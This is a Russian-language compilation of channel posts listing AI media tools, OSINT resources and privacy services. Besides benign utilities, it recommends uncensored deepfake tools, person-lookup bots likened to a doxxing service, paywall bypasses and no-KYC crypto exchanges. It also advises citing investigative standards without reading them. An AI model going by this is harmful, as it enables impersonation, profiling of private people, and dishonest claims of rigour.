      <text:p text:style-name="P39">Используем блага нейросетей. Часть 28:</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T6">1. same.new (https://same.new/) - бесплатная нейронка, которая копирует любой сайт 1 в 1, забирая целые UI-элементы вместе с кодом;</text:span></text:p>
      <text:p text:style-name="P39">2. OpenAI FM (https://www.openai.fm/) - инструмент с крайне внушительным функционалом для работы со звуком и речью от OpenAI;</text:p>
      <text:p text:style-name="P39">3. Flora <text:s/>(https://www.florafauna.ai/) - нейро-редактор изображений и видео на стеройдах, под капотом Gemini 2.0 Flash, Flux Pro 1.1, Stable Diffusion 3.5, Hailuo и Luma Dream Machine;</text:p>
      <text:p text:style-name="P39">4. Lovable (https://lovable.dev/) - генератор простых, но рабочих сайтов, достаточно лишь текстового описания. Бесплатный;</text:p>
      <text:p text:style-name="P39">5. Thera (https://huggingface.co/spaces/prs-eth/thera) - улучшает фотографии прямо в браузере, можно использовать онлайн или локально, бесплатный;</text:p>
      <text:p text:style-name="P42">6. Elphame (https://elphame.com/) - идеальный инструмент для подготовки к зачетам и экзаменам, отвечает на любой вопрос и генерирует темы-модули по заданной теме;</text:p>
      <text:p text:style-name="P43">7. InfiniteYou-FLUX <text:s/>(https://huggingface.co/spaces/ByteDance/InfiniteYou-FLUX) - свежий продукт для создания дипфейков, под капотом Flux, но без цензуры, на выходе получаются правдоподобные дипы;</text:p>
      <text:p text:style-name="P39">Удаление фона фотографии это очень распространённая задача. А так как задача эта всегда второстепенная, хочется это делать быстро и не заморачиваясь. Именно поэтому открывать каждый раз фотошоп немножко лень. Намного удобнее прямо в браузере и в пару нажатий. К счастью ресурсов умеющих это делать наплодилось достаточно, остаётся только выбрать те которые умеют это лучше других (желательно без регистрации и бесплатно). На данный момент мне больше всего нравится </text:p>
      <text:p text:style-name="P39">https://huggingface.co/spaces/briaai/BRIA-RMBG-2.0 </text:p>
      <text:p text:style-name="P39">В целом очень точно определяет и удаляет фон. На пёстрых фото с кучей мелких деталей иногда может что-то по мелочи пропускать, но не критично, и в сравнении с аналогами справляется заметно лучше. Есть ещё неплохие варианты:</text:p>
      <text:p text:style-name="P39">https://snapedit.app/ru/background-remover - тоже очень не плохо умеет чистить фон, но в замороченных случаях иногда удаляет, то что удалять не нужно было</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T6">https://www.remove.bg - в целом средненько, но большой плюс в том, что после удаления можно восстановить или удалить определённые участки, потому, если немного заморочиться можно сделать качественно</text:span></text:p>
      <text:p text:style-name="P40">https://removal.ai - на качественных фотографиях, где фон хорошо выделяется, делает нормально, на некачественных может наудалять лишнего. Но в целом достойно, можно использовать</text:p>
      <text:p text:style-name="P39">Используем блага нейросетей. Часть 29:</text:p>
      <text:p text:style-name="P39">1. Auphonic (https://auphonic.com/engine/) - нейронка для работы со звуком, улучшения качества и удаления фоновых шумов;</text:p>
      <text:p text:style-name="P39">2. Dreamina (https://dreamina.capcut.com/ai-tool/video/lip-sync/generate) - генератор реалистичных картинок, видео, оживляет портреты и т.д. Работает с VPN</text:p>
      <text:p text:style-name="P39">3. Clear Background (https://www.clear-background.com/) - бесплатная тулза без ограничений, которая удаляет фон с любой картинки;</text:p>
      <text:p text:style-name="P39">4. Kozy <text:s/>(https://www.kozy.studio/) - профессиональный видеомонтаж без усилий и сложных программ; </text:p>
      <text:p text:style-name="P39">5. starvector (https://huggingface.co/spaces/starvector/starvector-1b-im2svg) - бесплатный генератор SVG из любых картинок;</text:p>
      <text:p text:style-name="P41">6. Genspark (https://www.genspark.ai/) - бесплатный ИИ-комбайн и суперагент;</text:p>
      <text:p text:style-name="P40">7. Browserable (https://github.com/browserable/browserable) - создает ИИ агентов прямо в браузере.</text:p>
      <text:p text:style-name="P39">Наводим резкость на МАКСИМУМ - топ апскейлеры, которые спасут даже самое мыльное фото:</text:p>
      <text:p text:style-name="P39">Flux.1-dev (https://huggingface.co/spaces/jasperai/Flux.1-dev-Controlnet-Upscaler) - апскейлит на базе мощной Flux, отлично справляется с деталями.</text:p>
      <text:p text:style-name="P39">Tile-Upscaler (https://huggingface.co/spaces/gokaygokay/Tile-Upscaler) - ещё один годный вариант, если нужно быстро и без лишних кнопок.</text:p>
      <text:p text:style-name="P40">GFPGAN (https://huggingface.co/spaces/nightfury/Image_Face_Upscale_Restoration-GFPGAN) - реставрирует старые фотки и лица как по волшебству. Особенно хорош, если нужно поднять архивное фото в HD</text:p>
      <text:p text:style-name="P39">Как быстро определить, кто слушает порт и с каким процессом он связан. При отладке сети или проверке безопасности важно понять, какой процесс держит нужный порт и на каком интерфейсе он висит. Пошагово:</text:p>
      <text:p text:style-name="P39">1. Показать процессы, слушающие порты: ss -tulnp</text:p>
      <text:p text:style-name="P39">- -tulnp - TCP+UDP, слушающие (-l), номера портов и PID/имя процесса.</text:p>
      <text:p text:style-name="P39">2. Фильтрация по порту: ss -tulnp | grep ':443'</text:p>
      <text:p text:style-name="P39">Покажет, кто держит 443 порт (например, nginx, apache, docker-proxy и т.д.)</text:p>
      <text:p text:style-name="P39">3. Выяснить IP-привязку: ss -tulnp | grep ':22 '</text:p>
      <text:p text:style-name="P39">Если Local Address = 0.0.0.0:22 - слушает на всех интерфейсах, если 127.0.0.1:22 - только на localhost.</text:p>
      <text:p text:style-name="P39">Зачем это нужно:</text:p>
      <text:p text:style-name="P39">– Диагностика конфликтов портов (например, два демона на 80 порту); <text:s/></text:p>
      <text:p text:style-name="P39">– Проверка на unexpected процессы, слушающие наружу; <text:s/></text:p>
      <text:p text:style-name="P39">– Быстрая проверка iptables/nftables, когда порт не доступен извне.</text:p>
      <text:p text:style-name="P39">Трюк:</text:p>
      <text:p text:style-name="P39">Добавь алиас в .bashrc: alias ports='ss -tulnp | grep -v 127.0.0.1'</text:p>
      <text:p text:style-name="P20"><text:soft-page-break/><text:span text:style-name="T6">Покажет только "наружу слушающие" процессы - удобно для безопасности.</text:span><text:span text:style-name="T6"/></text:p>
      <text:p text:style-name="P39">Меняем крипту на крипту без KYC. Часть 3:</text:p>
      <text:p text:style-name="P39">1. https://vexl.it/</text:p>
      <text:p text:style-name="P39">2. https://orangefren.com/</text:p>
      <text:p text:style-name="P39">3. https://haveno.exchange/</text:p>
      <text:p text:style-name="P39">4. https://hodlhodl.com/</text:p>
      <text:p text:style-name="P40">5. https://peachbitcoin.com/</text:p>
      <text:p text:style-name="P39">Немного про создание deepfake-видео. Тема актуальная и не то чтобы очень сложная, как выяснилось (если не вникать в детали). Пока перечислю инструменты, которые производят впечатление толковых, а про нюансы этого процесса поговорим как-нибудь отдельно</text:p>
      <text:p text:style-name="P39">https://github.com/hacksider/Deep-Live-Cam - умеет менять лица как на уже записанном видео, так и в реальном времени. Имеет встроенный фильтр чувствительного контента. </text:p>
      <text:p text:style-name="P40">https://github.com/iperov/DeepFaceLive - тоже меняет лицо с веб-камеры или лицо на видео. Ещё умеет управлять статичным изображением лица, например заставлять его разговаривать. <text:s/>Если повозиться с настройками, то можно сделать что-то плюс-минус похожее на реальность. В целом этот вариант не плохо работает, но давно не обновлялся.</text:p>
      <text:p text:style-name="P39">Информация, где бы она не была найдена, имеет очень неприятное свойство изменяться или исчезать. Интернет конечно всё помнит (в теории), но вот только не всё может получится второй раз найти. Поэтому обязательная практика это архивировать все источники, которые имеют хоть какую-то важность. Причём делать это нужно так, чтобы было понятно где это было найдено и в каком виде оно там лежало. То как фиксировать доказательства, в основном зависит от того куда потом пойдут ваши материалы. Ну и частично от того, как часто вам придётся возвращаться к первоисточнику. Оптимальный вариант и программа минимум, в большинстве случаев, это: </text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T6">Сохранить нужную страницу в веб-архив: https://web.archive.org; https://archive.is. Сделать себе скриншот страницы. Для этого можно </text:span><text:soft-page-break/><text:span text:style-name="T6">использовать: https://www.printfriendly.com - оно подходит не только чтобы скринить нужное место, но и сохранять всю страницу целиком. Там есть расширение для браузера, одной кнопкой всё сохраняется. Почти всегда этого достаточно.</text:span></text:p>
      <text:p text:style-name="P39">Но если хочется более продвинутого подхода, то можно использовать приложения. Например https://hunch.ly <text:s/>- оно, во-первых, ведёт журнал и фиксирует все места которые вы посещали, а во-вторых можно отдельно сохранять ссылки, страницы, файлы, делать записи и заметки. Тоже вполне рабочий способ. Но на любителя. 30 дней бесплатно, потом просят занести 110$.</text:p>
      <text:p text:style-name="P42">Ещё один вариант это: https://www.osint-tool.com - работает как расширение браузера. Тоже очень достойная штука. Кроме того что ведёт журнал посещённых сайтов и позволяет их сохранять, ещё и собирает с них информацию, такую как почты, телефоны, ссылки и т. д.</text:p>
      <text:p text:style-name="P43">А также добавляет дополнительное меню быстрых действий для использования поисковиков, поиска изображений, сохранения отдельных фрагментов страницы и так далее. Там ещё подборка инструментов есть, которые можно применять сразу к собранным данным. В целом очень достойный инструмент, не бесплатный, стоит 8$ в месяц.</text:p>
      <text:p text:style-name="P39">Продолжаем раскрывать тему фиксации доказательств при сборе информации. Я думаю не нужно объяснять, что видеозаписи это достаточно ценный источник информации. Эта ценность, в большинстве, обусловлена наглядностью и информативностью. А потому найденные видео всегда нужно сохранять себе, потому как если оно будет удалено, искать копию, это само по себе не нужный головняк, и ещё не факт что получится найти. Некоторые социальные сети не очень хотят добровольно расставаться с контентом, а потому приходится помогать им сторонними инструментами. Всяких скачивалок существует конечно же не мало, но, как обычно, хочется быстро и не заморачиваясь:</text:p>
      <text:p text:style-name="P39">https://cobalt.tools - универсальный вариант и наверное самый удобный. Вставил ссылку - скачал. Без регистраций, рекламы и всего остального. Поддерживает YouTube, Instagram, Facebook, TikTok и так далее, почти все распространённые соцсети</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T6">https://instaclip.app - умеет скачивать контент из Instagram: видео, фото, ролики, истории, IGTV (также поддерживает TikTok, Youtube, Facebook). Регистрация не нужна, принцип работы как и у предыдущего - вставил ссылку - скачал</text:span></text:p>
      <text:p text:style-name="P39">https://twittervideodownloader.com - качает видео из Twitter </text:p>
      <text:p text:style-name="P40">https://ttvdl.com - качает видео из TikTok</text:p>
      <text:p text:style-name="P39">Не самая распространённая ситуация, но точно одна из самых скучных, это работать со звуковыми файлами. Всякие там диктофонные записи и подобная этому история. Особенно не весело становится если качество записи очень не студийное. А потому несколько инструментов которые могут иногда помочь:</text:p>
      <text:p text:style-name="P39">https://audiochum.com/voiceisolation/ - инструмент изоляции голоса. Отделяет голос от фонового шума</text:p>
      <text:p text:style-name="P39">https://audiochum.com/voicerestore/ - восстановит голос из плохой записи</text:p>
      <text:p text:style-name="P39">https://audiochum.com/voiceseparation/ - если на записи голоса нескольких человек, попытается разделить их и убрать помехи</text:p>
      <text:p text:style-name="P39">Ну и несколько дополнительных инструментов из этой же темы:</text:p>
      <text:p text:style-name="P39">https://tuberipper.com/35/save/mp3 - извлечет и сохранит звук из видео YouTube</text:p>
      <text:p text:style-name="P39">https://audio-extractor.net - извлечет звук из видео файла</text:p>
      <text:p text:style-name="P40">Что касается транскрипции звука в текст, то лично мне нравится как справляется Google Pinpoint: https://journaliststudio.google.com/pinpoint/</text:p>
      <text:p text:style-name="P39">Зашифрованные DNS-профили: Представляют собой конфигурационные файлы или настройки, которые позволяют устройствам (особенно на таких платформах, как iOS, iPadOS, macOS и tvOS) использовать защищённые протоколы DNS, такие как DNS over HTTPS (DoH) или DNS over TLS (DoT):</text:p>
      <text:p text:style-name="P39">1. https://github.com/mullvad/encrypted-dns-profiles</text:p>
      <text:p text:style-name="P39">2. https://github.com/paulmillr/encrypted-dns</text:p>
      <text:p text:style-name="P39">3. https://github.com/harshanand120/encrypted-dns-apple</text:p>
      <text:p text:style-name="P39">4. https://github.com/mullvad/dns-blocklists</text:p>
      <text:p text:style-name="P40">5. https://github.com/alecmuffett/dohot</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T6">Файловые поисковые системы:</text:span></text:p>
      <text:p text:style-name="P39">1. https://nyaa.si/</text:p>
      <text:p text:style-name="P39">2. https://btdig.com/</text:p>
      <text:p text:style-name="P39">3. https://bitsearch.to/</text:p>
      <text:p text:style-name="P39">4. https://filepursuit.com/</text:p>
      <text:p text:style-name="P39">5. https://softarchive.is/</text:p>
      <text:p text:style-name="P40">6. https://scnlog.me/</text:p>
      <text:p text:style-name="P39">общедоступные онлайн камеры:</text:p>
      <text:p text:style-name="P39">https://www.earthcam.com - огромный каталог камер по всему миру. Можно искать по списку, можно выбирать на карте</text:p>
      <text:p text:style-name="P39">https://youwebcams.org - тоже каталог камер, показывает картинку с камеры, место на карте где она расположена и описание того что показывает</text:p>
      <text:p text:style-name="P39">https://worldcams.tv/map/ - карта расположения камер. Их там не так много, но из полезного, то что каждая помечена значком - туристические, промышленность, пейзаж и т.д.</text:p>
      <text:p text:style-name="P39">https://www.windy.com (https://www.windy.com/ru/-%D0%92%D0%B5%D0%B1-%D0%BA%D0%B0%D0%BC%D0%B5%D1%80%D1%8B/webcams) - карта туристических камер. Список меняется в зависимости от выбранного на карте места</text:p>
      <text:p text:style-name="P39">https://cipher387.github.io/webcamcse/ - Google CSE для поиска камер по 10 источникам. Можно искать, например, по городу</text:p>
      <text:p text:style-name="P40">https://sunders.uber.space/ - карта расположения камер видеонаблюдения (не только общедоступных). Показывает место, где весит камера, направление и угол обзора</text:p>
      <text:p text:style-name="P39">Как и где отслеживать международные поставки. Первое что нужно запомнить, это на какую информацию обращать внимание:</text:p>
      <text:p text:style-name="P39">◾️экспортёр / импортёр. Т.е. кто поставляет товар, а кто получает;</text:p>
      <text:p text:style-name="P39">◾️транспортная компания. Это не всегда важно, но если такая информация попалась, стоит её записать;</text:p>
      <text:p text:style-name="P39">◾️страна происхождения / страна назначения. Т.е. то в какой стране была произведена продукция и конечная точка куда она едет;</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T6">◾️поставляемая продукция;</text:span></text:p>
      <text:p text:style-name="P39">◾️даты операций.</text:p>
      <text:p text:style-name="P39">Ресурсы, где можно искать информацию о поставках:</text:p>
      <text:p text:style-name="P39">https://en.52wmb.com - это база данных экспортно-импортных операций. Содержит огромное количество данных, в том числе информацию таможенных деклараций, информацию о компаниях, контрагентах, поставляемой продукции и маршрутах поставок. Но это всё в платной версии. В бесплатной сильно меньше. Поэтому если вам предстоит плотно работать по этому направлению, то это тот ресурс где точно есть смысл купить подписку</text:p>
      <text:p text:style-name="P39">https://www.importgenius.com - это тоже таможенные данные об импорте / экспорте. Достаточно информативный ресурс даже в бесплатной версии</text:p>
      <text:p text:style-name="P42">https://www.exportgenius.in - это ресурс с данными по категориях импортируемых товаров по странам: партнеры, порты и названиям компаний-импортеров</text:p>
      <text:p text:style-name="P42">https://www.track-trace.com/container - использует номер транспортного контейнера, чтобы определить, какой компании он принадлежит, и даёт ссылку на сайт компании для его отслеживания</text:p>
      <text:p text:style-name="P40">https://opensupplyhub.org - поиск данных о цепочке поставок по всему миру по названию предприятия, стране, компании, типу продукта и другим фильтрам. В основном полезен как источник информации о производителе продукции. База у них не очень большая, но проверять стоит. Причем здесь стоит смотреть не только по конечной продукции, но и по сырью из которого её производят</text:p>
      <text:p text:style-name="P48">Разного рода бюрократы, в попытке оправдать своё существование, любят придумывать всякие стандарты, а потом хотят что бы все им соответствовали. И я допускаю, что в некоторых сферах, это может иметь смысл, а где-то даже необходимо. Но, на мой скромный взгляд, попытка стандартизировать изыскательные направления, к которым относится и OSINT, это что-то близкое к ереси. Потому как тут может быть всего два варианта: либо вы сделали качественное, а значит убедительное расследование, либо нужно ещё поработать.</text:p>
      <text:p text:style-name="P48">Я конечно понимаю зачем это делается, но вот реальная эффективность подобного процесса, скажем так, близка к нулевой.</text:p>
      <text:p text:style-name="P49">Но пиджаки это хавают с неподдельным аппетитом, а потому вам стоит знать на что можно ссылаться в своих материалах, чтобы <text:s/>добавить корпоративной убедительности.</text:p>
      <text:p text:style-name="P48">Читать всё это нужно только если реально интересно, во всех остальных случаях можно просто, где-то на видном месте, добавит фразу, типа: “Расследование проведено и оформлено в соответствии с международными стандартами и требованиями, предусмотренными: подставить нужное”</text:p>
      <text:p text:style-name="P48">https://www.ohchr.org/en/publications/policy-and-methodological-publications/berkeley-protocol-digital-open-source - Протокол Беркли.</text:p>
      <text:p text:style-name="P48">Если бы меня попросили описать его одной фразой, это была бы фраза “апогей словоблудия”. Почти 100 страниц настолько очевидных вещей, большую часть которых любой адекватный человек соблюдает на уровне инстинктов. Если в Протоколе Беркли оставить только хоть сколько-нибудь полезную информацию, итоговый документ займёт наверное страниц 5-7. </text:p>
      <text:p text:style-name="P48">https://www.dni.gov/files/documents/ICD/ICS-206-01.pdf - стандарт разведывательного сообщества ICS 206–01. </text:p>
      <text:p text:style-name="P50">Сильно короче и намного конкретнее, с вполне логичными требованиями к оформлению и фиксации доказательств. <text:s/>Оформлять именно так, как там написано особого смысла нет, если конечно вы не сотрудник какой-то из американских разведок. Так что достаточно просто упомянуть сам стандарт, всё равно его никто не читал.</text:p>
      <text:p text:style-name="P48">Ныряем в OSINT в 2025:</text:p>
      <text:p text:style-name="P48">1. PlatesMania (https://platesmania.com/) - база фотографий автомобилей в РФ и СНГ;</text:p>
      <text:p text:style-name="P48">2. sherlock <text:s/>(https://t.me/mSherlokOSINT_bot?start=_ref_nZkGfF_gpePgv) - пожалуй, один из лучших аналогов легендарного ГБ;</text:p>
      <text:p text:style-name="P48">3. ospace <text:s/>(https://ospace.org/etap) - карта этапирования заключенных по всей стране с визуализацией;</text:p>
      <text:p text:style-name="P48">4. OpenRailwayMap (https://www.openrailwaymap.org/) - карта железнодорожной инфраструктуры мира, построенная на данных OpenStreetMap;</text:p>
      <text:p text:style-name="P51">5. Steam DB (https://steamdb.info/) - ковыряем аккаунты Steam, получая всю возможную по ним статистику;</text:p>
      <text:p text:style-name="P52">6. Interpol Wanted (https://www.interpol.int/How-we-work/Notices/Red-Notices/View-Red-Notices) - база данных лиц, находящихся в розыске Интерпола.</text:p>
      <text:p text:style-name="P51">Ныряем в OSINT в 2025 [2]:</text:p>
      <text:p text:style-name="P51">1. sherlock <text:s/>(https://t.me/mSherlokOSINT_bot?start=_ref_nZkGfF_gpePgv) - пожалуй, лучший бот в своей тематике на данный момент;</text:p>
      <text:p text:style-name="P51">2. SteamID (https://steamid.uk/) <text:s/>- еще один сервис по сбору информации со steam-аккаунтов;</text:p>
      <text:p text:style-name="P51">3. OSINT-Tools-Russia (https://github.com/paulpogoda/OSINT-Tools-Russia) <text:s/>- подборка всевозможных сервисов и сайтов по ру;</text:p>
      <text:p text:style-name="P51">4. Список открытых чатов (https://combot.org/top/telegram/groups) <text:s/>- список из 6900 чатов на русском языке в Telegram;</text:p>
      <text:p text:style-name="P53">5. Open Measures (https://public.openmeasures.io/) <text:s/>- поиск по ключевым словам в комментариях/публикациях в различных social media </text:p>
      <text:p text:style-name="P51">Ныряем в OSINT в 2025 [3]:</text:p>
      <text:p text:style-name="P51">1. VK Paranoid Tools (https://vkpt.info/) - топовый аналитический инструмент профилей «ВКонтакте»;</text:p>
      <text:p text:style-name="P51">2. Telegago (https://cse.google.com/cse?cx=006368593537057042503%3Aefxu7xprihg&amp;ref=exploit.media#gsc.tab=0) - поиск по Telegram от корпорации зла Google;</text:p>
      <text:p text:style-name="P51">3. BirdHunt <text:s/>(https://birdhunt.huntintel.io/) - поиск постов в Х по геометкам;</text:p>
      <text:p text:style-name="P53">4. YouTube Geofind (https://mattw.io/youtube-geofind/) - сервис поиска роликов на YouTube по геолокации.</text:p>
      <text:p text:style-name="P51">слайды и презентации:</text:p>
      <text:p text:style-name="P51">Дополню тему слайдов. Есть огромное количество ресурсов умеющих генерировать слайды/схемы/презентации из текста. Все справляются по-разному, но в итоге я остановился на этих:</text:p>
      <text:p text:style-name="P51">https://www.napkin.ai идеальный вариант если нужно сделать схему отражающую суть или основные идеи текста. Схемы из поста выше (https://t.me/Pulsechanel/570) были сделаны здесь. Работает очень не сложно. Закидываешь нужный кусок текста, и он предлагает варианты дизайна и <text:soft-page-break/>оформления, выбираешь тот который нравится получаешь готовую схему. Каждый элемент можно дополнительно отредактировать руками. Бесплатно дают 500 кредитов в неделю, которые тратятся из расчёта 1 кредит за каждое слово, выбранное для создания. Подписка стоит 12$/месяц.</text:p>
      <text:p text:style-name="P51">https://gamma.app это прикольный вариант для создания презентаций. Грузишь свой текст, затем разбиваешь его на нужное количество частей каждая часть станет отдельным слайдом (в бесплатной версии лимит 10 слайдов за раз). Можно выбрать стиль презентации. Кроме текста, он создаст картинки, схемы, диаграммы и т.д. Всё созданное можно потом редактировать, в том числе добавляя свои элементы. Бесплатно дают 400 кредитов, их хватит +на десяток презентаций. Подписка стоит 10$/месяц.</text:p>
      <text:p text:style-name="P53">https://flourish.studio можно создавать графики, проекционные <text:s/>и 3D-карты, иерархические и столбчатые диаграммы, и всякие другие карты и слайдеры. Есть даже схема расположения игроков на футбольном поле и карты турнирных сеток. Любой вариант открываем и вставляем туда свои данные, затем настраиваем внешний вид, например цвета, шрифты, заголовки, отступы, короче всё что угодно. Бесплатно, лимитов нет.</text:p>
      <text:p text:style-name="P53">Некоторые нюансы использования https://web.archive.org. Веб-архив хранит снимки веб-страниц. Вводим адрес и видим календарь, в котором отмечены даты за которые есть сохранённые снимки. Сверху видим временную шкалу с разбивкой по годам. Тут важно помнить, что это не даты когда на сайт вносились изменения. Wayback Machine не следит за ними в режиме онлайн. Это даты когда сделан снимок. Кроме календаря, есть дополнительные разделы: Changes - раздел для поиска изменений. <text:s/>Здесь синими и зелёными квадратиками отмечены даты когда сделанный снимок отличался от предыдущего. Выбираем нужные даты и жмём "Compare". Откроется окно разделённое на две части. В них будут показаны снимки страницы за выбранные даты. Обнаруженные изменения в одном окне будут отмечены жёлтым, в другом синим. Site Map - карта сайта в виде диаграммы. В центре главная страница, а вокруг страницы, снимки которых есть в архиве. Когда мы наводим курсор на какой-то элемент, нам показывают ссылку на соответствующую страницу. Summary - общая сводка о том какое количество каких данных найдено и сохранено на сайте. URLs - список страниц сайта для <text:soft-page-break/>которых есть снимок. В том числе мы видим сколько всего было снимков, сколько из них уникальных, а сколько одинаковых. Кроме того, при использовании web.archive.org не стоит забывать, что он собирает не только снимки страниц, но и документы, видео, аудио и фотографии. И по ним тоже нужно пробовать искать, потому как иногда получается найти что-то интересное. Поиск происходит по ключевым словам и с использованием фильтров. Это может быть тип контента, автор, дата, язык и так далее.</text:p>
      <text:p text:style-name="P51">Подборка FaceSwap/Deepfake ИИ-сервисов:</text:p>
      <text:p text:style-name="P51">1. https://github.com/iperov/DeepFaceLive</text:p>
      <text:p text:style-name="P51">2. https://github.com/iperov/DeepFaceLab</text:p>
      <text:p text:style-name="P51">3. https://deepfakesweb.com/</text:p>
      <text:p text:style-name="P51">4. https://github.com/deepfakes/faceswap</text:p>
      <text:p text:style-name="P51">5. https://www.deepswap.ai/ru</text:p>
      <text:p text:style-name="P51">6. https://www.heygen.com/tool/deepfake-maker</text:p>
      <text:p text:style-name="P51">7. https://pixlr.com/face-swap/</text:p>
      <text:p text:style-name="P51">8. https://www.kapwing.com/tools/make/deepfake</text:p>
      <text:p text:style-name="P51">9. https://aifaceswap.io/</text:p>
      <text:p text:style-name="P51">10. https://pixlr.com/face-swap/</text:p>
      <text:p text:style-name="P51">11. https://remaker.ai/face-swap-free/</text:p>
      <text:p text:style-name="P51">12. https://faceswapper.ai/</text:p>
      <text:p text:style-name="P51">Сервсы, определяющие наличие Deepfake/Faceswap:</text:p>
      <text:p text:style-name="P51">1. https://deepware.ai/</text:p>
      <text:p text:style-name="P51">2. https://github.com/chinmaynehate/DFSpot-Deepfake-Recognition</text:p>
      <text:p text:style-name="P51">3. https://www.aiornot.com/</text:p>
      <text:p text:style-name="P51">4. https://illuminarty.ai/en/</text:p>
      <text:p text:style-name="P51">5. https://platform.openai.com/ai-text-classifier</text:p>
      <text:p text:style-name="P51">6. https://gptzero.me/</text:p>
      <text:p text:style-name="P51">7. https://crossplag.com/ai-content-detector/</text:p>
      <text:p text:style-name="P51">8. https://faceonlive.com/deepfake-detector/</text:p>
      <text:p text:style-name="P51">9. https://deepfakedetector.ai/</text:p>
      <text:p text:style-name="P51">10. https://www.swapfaces.ai/face-swap-detector</text:p>
      <text:p text:style-name="P54">Смотрим TikTok анонимно и без регистрации:</text:p>
      <text:p text:style-name="P51">1. TikFace <text:s/>(https://www.tikface.com/) - сервис для анонимного просмотра профилей, видео и сторис в TikTok.</text:p>
      <text:p text:style-name="P51">2. Urlebird (https://urlebird.com/) <text:s/>- еще один сервис для анонимного просмотра TikTok видео без приложения.</text:p>
      <text:p text:style-name="P51">3. TikTok Video Date Extractor (https://trevorfox.com/tools/tiktok-video-date-extractor/) <text:s/>- позволяет узнать точную дату и время публикации любого видео или фото в TikTok.</text:p>
      <text:p text:style-name="P51">4. Advanced video search (https://www.google.com/advanced_video_search) <text:s/>- расширенный видеопоиск Google, в котором можно искать по TikTok видео;</text:p>
      <text:p text:style-name="P53">5. Trollishly (https://www.trollishly.com/free-tiktok-profile-viewer/) - еще один сервис, позволяющий анонимно просматривать TikTok профили.</text:p>
      <text:p text:style-name="P51">Добавил в каталог инструментов https://hacker-basement.com/osint-list/ раздел с инструментами для TikTok. Кстати, чтобы было удобно ориентироваться, каталог теперь имеет удобное оглавление, где разделы распределены по направлениям. </text:p>
      <text:p text:style-name="P51">https://dfir.blog/unfurl/ - это инструмент не прям под ТікТок, но полезен для быстрого сбора базовой информации про видео. Вставляешь ссылку и он рисует схемку с ником автора, ID, датой и временем публикации;</text:p>
      <text:p text:style-name="P51">https://bellingcat.github.io/tiktok-timestamp/ - полезно, если нужно просто узнать дату и время публикации. Вставил ссылку - получил дату и время;</text:p>
      <text:p text:style-name="P51">https://www.famety.net/find-tiktok-user-id - покажет TikTok User ID и аватарку аккаунта в нормальном размере; TikTok User ID можно узнать ещё проще: откройте любое видео нужного автора в браузере, затем нажмите ctrl+U чтобы увидеть код страницы, там жмёте ctrl+F и в поле поиска вводите: "author":{"id" после двоеточия будет User ID. В обратную сторону тоже работает - если после tiktok.com/@ вписать ID, то перейдёте на страницу автора.</text:p>
      <text:p text:style-name="P51">https://cobalt.tools - скачает видео из TikTok;</text:p>
      <text:p text:style-name="P55">https://exportcomments.com - скачает комментарии к видео. Их можно там же посмотреть или сохранить в xls или csv (таблица будет формата: пользователь-дата-текст-id);</text:p>
      <text:p text:style-name="P56">https://omar-thing.site - покажет информацию об аккаунте: аватар (можно скачать), имя, ID, описание, язык, страна, дата создания, количество подписчиков, видео и лайков;</text:p>
      <text:p text:style-name="P53">https://urlebird.com - просмотр видео без регистрации и аккаунта. Показывает статистику по аккаунту и видео, там же видео можно скачать. По ссылкам на видео есть небольшой нюанс: если вы копируете с мобильного приложения, она будет формата vm.tiktok… вот это vm. нужно убрать. Для этого откройте ссылку в браузере, vm. исчезнет, а в конце ссылки будет ? и за ним куча символов, этот ? и всё что после него тоже удаляем.</text:p>
      <text:p text:style-name="P51">Нах#й Paywall. Еще в прошлом году удалили легендарное расширение Bypass Paywalls Сlean и около 4000 его форков с GitHub. Однако, с приходом ИИ, вопрос пэйволов перестает быть актуальным. </text:p>
      <text:p text:style-name="P51">1. https://www.smry.ai/ - обходит пэйволл и делает выжимку по каждой статье;</text:p>
      <text:p text:style-name="P51">2. magnolia (https://gitflic.ru/user/magnolia1234) - а вот сюда переехал оригинальный Bypass Paywalls Сlean;</text:p>
      <text:p text:style-name="P51">3. https://www.removepaywall.com/ - еще один похожий сервис;</text:p>
      <text:p text:style-name="P51">4. https://byebyepaywall.com/en/ - агрегатор всех популярных сервисов bp и архивов:</text:p>
      <text:p text:style-name="P53">Бонус: ИИ браузеры, Atlas (https://openai.com/index/introducing-chatgpt-atlas/) и Comet (https://www.perplexity.ai/comet), так же прекрасно справляются с обходом пэйволов.</text:p>
      <text:p text:style-name="P51">Следим за криптой. Часть 2.</text:p>
      <text:p text:style-name="P51">Clear:</text:p>
      <text:p text:style-name="P51">1. Blockstream Explorer (https://blockstream.info/) - один из самых точных обозревателей для Bitcoin и Liquid Network, есть .onion зеркало;</text:p>
      <text:p text:style-name="P51">2. Etherscan (https://etherscan.io/) - основной обозреватель ETH сети;</text:p>
      <text:p text:style-name="P51">3. XMRchain (https://xmrchain.net/) - статичный обозреватель XMR сети;</text:p>
      <text:p text:style-name="P51">4. TronScan (https://tronscan.org/#/) - классический и основной обозреватель для TRC-20;</text:p>
      <text:p text:style-name="P57">5. Blockscout (https://www.blockscout.com/) - поддерживает десятки EVM-сетей, есть функционал декодирования контрактов;</text:p>
      <text:p text:style-name="P58">6. Tokenview (https://tokenview.io/) - поддержка различных бч, кросс-чейн мониторинг, функционал графов и т.д.</text:p>
      <text:p text:style-name="P51">7. Market Indicators (https://t.me/market_revue) - глобальный отчет по рынку (крипта, акции, ресурсы) три раза в день.</text:p>
      <text:p text:style-name="P51">8. Transactions Tracker <text:s/>(https://t.me/txid_tracker_bot) - отслеживает ВТС, LTC, XMR транзакции и присылает уведомление о получении подтверждений.</text:p>
      <text:p text:style-name="P51">Onion:</text:p>
      <text:p text:style-name="P51">Blockstream Bitcoin Explorer (http://explorerzyaduh5bouna3ub2yq5kwc2seavdt2uerj4ds3lvvjcaqad.onion/)</text:p>
      <text:p text:style-name="P51">mempool.space (http://mempoolwyspsxmwmf4rhkx6v2djjgf3a44sppeu5gbov37yopgjtvd.onion/)</text:p>
      <text:p text:style-name="P51">Bisq Explorer (http://bisqz7tkj2cqjst2c4a7ndy5vp3h2m7ecgflbhmh36kkj3ktx2gahad.onion/)</text:p>
